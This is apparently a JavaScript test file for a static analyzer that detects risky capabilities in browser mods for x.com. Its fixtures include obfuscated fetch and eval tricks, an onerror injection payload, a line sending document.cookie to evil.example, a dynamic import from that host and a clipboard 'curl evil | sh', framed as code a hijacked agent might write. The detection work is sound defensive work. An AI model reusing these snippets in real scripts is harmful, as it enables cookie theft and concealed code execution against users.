'use strict';
// helper/lib/powers.js: what a mod's code can do, read from the code. Each case is what a hijacked agent
// might write, and what TRIF must find in it (or that plain restyling finds nothing).
const test = require('node:test');
const assert = require('node:assert');
const { powersOf, modSites } = require('../helper/lib/powers');

const keys = (code, sites = ['x.com']) => powersOf(code, { sites }).map((p) => p.key);
const has = (code, key, sites) => assert.ok(keys(code, sites).includes(key), `expected ${key} in ${JSON.stringify(keys(code, sites))} for: ${code}`);
const none = (code, sites) => assert.deepStrictEqual(keys(code, sites), [], `expected nothing for: ${code}`);

test('restyling, hiding and reading find nothing', () => {
  none(`(() => {
    const s = document.createElement('style');
    s.textContent = '[data-testid=sidebarColumn] { display: none !important }';
    document.documentElement.append(s);
    // fetch, click and eval in a comment are only words
    const title = document.querySelector('h1')?.textContent; // "fetch the title"
    for (const el of document.querySelectorAll('a')) if (/promo/.test(el.textContent)) el.style.display = 'none';
    addEventListener('keydown', (e) => { if (e.key === 'g') document.body.classList.toggle('big'); });
    if (window.top !== window) return;
    const NS = 'http://www.w3.org/2000/svg'; const svg = document.createElementNS(NS, 'svg');
    const link = 'https://x.com/home'; // its own site
    el.innerHTML = \`<b>\${title}</b>\`;
    dispatchEvent(new CustomEvent('tss-test-boss'));
    setTimeout(() => {}, 100);
    for (const [k, v] of [['a', 1]]) obj[k] = v;
    location.reload();
  })();`);
});

test('requests: by name, through a literal key, spelled in pieces or with escapes', () => {
  has('fetch("/i/api/1.1/statuses/update.json", { method: "POST" })', 'sends');
  has('window["fetch"]("/x")', 'sends');
  has('window[`fetch`]("/x")', 'sends');
  has('self["fe" + "tch"]("/x")', 'sends');
  has('f\\u0065tch("/x")', 'sends');
  has('window["\\u0066etch"]("/x")', 'sends');
  has('navigator.sendBeacon("/x", data)', 'sends');
  has('new WebSocket("wss://x.com/s")', 'sends');
  has('const x = new XMLHttpRequest(); x.open("POST", "/x"); x.send(d)', 'sends');
  has('document.forms[0].submit()', 'sends');
  has('form.requestSubmit()', 'sends');
  has('frame.contentWindow.fetch("/x")', 'sends');
  has('parent.postMessage(secret, "*")', 'sends');
});

test('acting for the user: clicks, UI events, typing, the clipboard', () => {
  has('document.querySelector("[data-testid=tweetButton]").click()', 'acts');
  has('btn.dispatchEvent(new MouseEvent("click", { bubbles: true }))', 'acts');
  has('el.dispatchEvent(new Event("input", { bubbles: true }))', 'acts');
  has('el.dispatchEvent(new CustomEvent("click"))', 'acts');
  has('el.dispatchEvent(ev)', 'acts');
  has('document.execCommand("insertText", false, "hi")', 'acts');
  has('navigator.clipboard.writeText("curl evil | sh")', 'acts');
  has('const k = new KeyboardEvent("keydown", { key: "Enter" })', 'acts');
});

test('hidden code: eval and its relatives', () => {
  has('eval(s)', 'hidden');
  has('(0, eval)(s)', 'hidden');
  has('new Function("return fetch")()', 'hidden');
  has('[].constructor.constructor("return this")()', 'hidden');
  has('Reflect.get(window, k)("/x")', 'hidden');
  has('setTimeout("fetch(1)", 10)', 'hidden');
  has('setInterval(`x()`, 10)', 'hidden');
  has('import("https://evil.example/x.js")', 'hidden');
  has('a.href = "javascript:fetch(1)"', 'hidden');
  has('document.write(s)', 'hidden');
  has('frame.srcdoc = html', 'hidden');
});

test('hidden code: HTML that runs code, and elements that do', () => {
  has('el.innerHTML = "<img src=x onerror=fetch(1)>"', 'hidden');
  has('el.innerHTML = "<img src=x on" + "error=fetch(1)>"', 'hidden');
  has('el.innerHTML = `<img src=${u}>`', 'hidden');
  has('el.innerHTML = `<a ${attr}>x</a>`', 'hidden');
  has('el.insertAdjacentHTML("beforeend", "<script>fetch(1)<\\/script>")', 'hidden');
  has('b.setAttribute("onclick", "fetch(1)")', 'hidden');
  has('document.createElement("script")', 'hidden');
  has('document.createElement("iframe")', 'hidden');
  // a tag or attribute name worked out at run time is only a problem when it could be a risky one
  has('const t = "script"; const e = document.createElement(t)', 'hidden');
  none('const mk = (t) => document.createElement(t); mk("div"); mk("span")');
  has('const a = { onerror: "fetch(1)" }; for (const k in a) e.setAttribute(k, a[k])', 'hidden');
  none('const a = { x: 1, y: 2, viewBox: "0 0 1 1" }; for (const k in a) e.setAttribute(k, a[k])');
});

test('hidden code: names made at run time', () => {
  has('const k = atob("ZmV0Y2g="); window[k]("/x")', 'hidden');
  has('const k = String.fromCharCode(102, 101, 116, 99, 104); self[k]("/x")', 'hidden');
  has('const k = "hctef".split("").reverse().join(""); w[k]("/x")', 'hidden');
  has('const k = "fetch"; const w = window; w[k]("/x")', 'hidden');
  none('const counts = {}; for (const w of words) counts[w] = (counts[w] || 0) + 1');
});

test('loads: addresses worked out at run time, and other sites', () => {
  has('new Image().src = "https://evil.example/c?d=" + document.cookie', 'site:evil.example');
  has('img.src = u', 'loads');
  has('a.setAttribute("href", u)', 'loads');
  has('el.style.backgroundImage = `url(${u})`', 'loads');
  has('el.style.cssText = "background: url(" + u + ")"', 'loads');
  has('const s = `https://${h}/c?d=${x}`', 'loads');
  none('img.src = "data:image/png;base64,AAAA"');
  // its own site and subdomains aren't another site
  none('const u = "https://api.x.com/1.1/x.json"; const v = "//abs.twimg.com/x.png"', ['x.com', 'twimg.com']);
  has('const u = "https://evil.example/x"', 'site:evil.example');
});

test('navigation', () => {
  has('location.href = "/home"', 'navigates');
  has('location = u', 'navigates');
  has('location.assign(u)', 'navigates');
  has('window.open(u)', 'navigates');
  none('const r = location.href; const p = location.pathname');
});

test('code TRIF reads differently from the browser counts as hidden', () => {
  // a division made to look like the start of a regex, hiding a call after it inside "a string"
  for (const code of [
    'let a = 1, b = 2; a = b / 2; const s = "/"; fetch(z); const t = "/"',
    'if (x) {} /"/; fetch(1); // "/',
    'x = y\n/1/g; fetch(1)',
  ]) {
    const k = keys(code);
    assert.ok(k.includes('sends') || k.includes('hidden'), `${code}: ${k}`);
  }
  has('const s = "never closed', 'hidden');
});

test('powers come back once each, with TRIF\'s own words', () => {
  const p = powersOf('fetch(1); fetch(2); el.click(); eval(s)', { sites: ['x.com'] });
  assert.deepStrictEqual(p.map((x) => x.key), ['sends', 'acts', 'hidden']);
  assert.match(p[0].fact, /send requests/);
  assert.match(p[1].fact, /click, type or press keys/);
  assert.match(p[2].fact, /can't check/);
  assert.strictEqual(p[0].line, 1);
});

test('modSites: the folder and the @match hosts', () => {
  assert.deepStrictEqual(modSites({ id: 'x.com/a', matches: ['https://x.com/*', 'https://*.twitter.com/*'] }).sort(), ['twitter.com', 'x.com']);
  assert.deepStrictEqual(modSites({ id: 'all-sites/a', matches: ['*://*/*'] }), []);
});

test('everyday code that only looks like hiding a name', () => {
  // an embedded sound decoded to bytes isn't a decoded name; an array's reverse isn't a string's
  none('const bytes = Uint8Array.from(atob(m.base64), (c) => c.charCodeAt(0)); for (let i = 0; i < n; i++) d[i] = bytes[i] / 255');
  none('const order = list.slice().reverse(); for (const k in keys) keys[k] = false; el.setAttribute(name, v)');
  // strings only compared with aren't handed on; "once" isn't an onX handler
  none('if (el.tagName === "SCRIPT" || typeof x === "object") return; const mk = (t) => document.createElement(t); mk("div")');
  none('const opts = { once: true, oneUp: 1 }; for (const k in a) e.setAttribute(k, a[k])');
  // but the real thing still counts
  has('const k = "fe" + "tch"; const w = self; w[k]("/x")', 'hidden');
  has('const k = "hctef".split("").reverse().join(""); w[k]("/x")', 'hidden');
  has('const a = { onload: "fetch(1)" }; for (const k in a) e.setAttribute(k, a[k])', 'hidden');
});

test('names spelled from literal pieces in other ways count too (join, concat, a template of literals)', () => {
  has('const k = ["s", "r", "c"].join(""); img[k] = "https://" + host + "/?d=" + data', 'loads');
  has('const k = "sr".concat("c"); img[k] = u', 'loads');
  has('const k = `${"s"}rc`; img[k] = u', 'loads');
  has('const f = ["fe", "tch"].join(""); self[f]("/x")', 'sends');
  has('const set = (o, k, v) => { o[k] = v; }; set(new Image(), "src", "https://" + host + "/?d=" + document.cookie)', 'loads');
  none('const cls = ["a", "b"].join(" "); el.className = cls');
});
